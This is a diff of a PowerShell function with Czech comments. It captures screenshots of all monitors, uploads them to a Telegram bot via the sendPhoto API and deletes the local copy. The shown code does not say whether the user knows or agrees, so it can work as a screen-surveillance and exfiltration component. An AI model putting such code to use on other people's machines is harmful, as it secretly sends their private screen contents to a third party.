@@ -92,84 +92,85 @@ function Send-Screenshot {
         return
     }
     
-    Write-Log "Delam screenshot..."
+    Write-Log "Delam screenshot vsech monitoru..."
     
     try {
-        # Načti System.Drawing a System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
         Add-Type -AssemblyName System.Windows.Forms
         
         # Získej všechny obrazovky
         $screens = [System.Windows.Forms.Screen]::AllScreens
         
-        # Najdi celkový bounding box všech obrazovek
-        $left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
-        $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
-        $right = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum
-        $bottom = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+        # Najdi minimální a maximální souřadnice
+        $minX = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
+        $minY = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
+        $maxX = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum
+        $maxY = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
         
-        $width = $right - $left
-        $height = $bottom - $top
+        $width = $maxX - $minX
+        $height = $maxY - $minY
+        
+        Write-Log "Screenshot rozmery: $width x $height (vsechny monitory)"
+        
+        if($width -le 0 -or $height -le 0) {
+            # Fallback na primární obrazovku
+            Write-Log "Neplatne rozmery, pouzivam primarni obrazovku"
+            $screen = [System.Windows.Forms.Screen]::PrimaryScreen
+            $minX = $screen.Bounds.Left
+            $minY = $screen.Bounds.Top
+            $width = $screen.Bounds.Width
+            $height = $screen.Bounds.Height
+        }
         
         # Vytvoř bitmap
-        $bounds = [System.Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
         $bitmap = New-Object System.Drawing.Bitmap $width, $height
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
         
-        # Zachyť obrazovku
-        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+        # Zachyť obrazovku od pozice ($minX, $minY)
+        $graphics.CopyFromScreen($minX, $minY, 0, 0, [System.Drawing.Size]::new($width, $height))
         
-        # Ulož do souboru
+        # Ulož
         $screenshotPath = "C:\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
         $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
         
-        # Uvolni prostředky
         $graphics.Dispose()
         $bitmap.Dispose()
         
         Write-Log "Screenshot ulozen: $screenshotPath"
         
         # Pošli do Telegramu
-        Write-Log "Odesilam screenshot do Telegramu..."
-        
         $uri = "https://api.telegram.org/bot$botToken/sendPhoto"
         
-        # Vytvoř multipart/form-data
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-        
-        $bodyLines = @(
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"chat_id`"$LF",
-            $chatId,
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
-            "Content-Type: image/png$LF",
-            [System.IO.File]::ReadAllBytes($screenshotPath),
-            "--$boundary--$LF"
-        )
-        
-        # Sestav body jako byte array
-        $bodyBinary = @()
-        foreach ($line in $bodyLines) {
-            if ($line -is [byte[]]) {
-                $bodyBinary += $line
-            } else {
-                $bodyBinary += [System.Text.Encoding]::UTF8.GetBytes($line + $LF)
+        try {
+            $form = @{
+                chat_id = $chatId
+                photo = Get-Item -Path $screenshotPath
             }
+            Invoke-RestMethod -Uri $uri -Method Post -Form $form | Out-Null
+        } catch {
+            $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
+            $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+            $boundary = [System.Guid]::NewGuid().ToString()
+            $LF = "`r`n"
+            $bodyLines = (
+                "--$boundary",
+                "Content-Disposition: form-data; name=`"chat_id`"$LF",
+                $chatId,
+                "--$boundary",
+                "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
+                "Content-Type: image/png$LF",
+                $fileEnc,
+                "--$boundary--$LF"
+            ) -join $LF
+            Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines | Out-Null
         }
         
-        # Pošli request
-        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBinary
-        
         Write-Log "Screenshot odeslan OK"
-        
-        # Smaž dočasný soubor
         Remove-Item $screenshotPath -Force
         
     } catch {
         Write-Log "ERROR pri screenshotu: $_"
-        Send-Message "[ERROR] Nepodarilo se udelat screenshot: $($_.Exception.Message)"
+        Send-Message "[ERROR] Screenshot selhal: $($_.Exception.Message)"
     }
 }
 
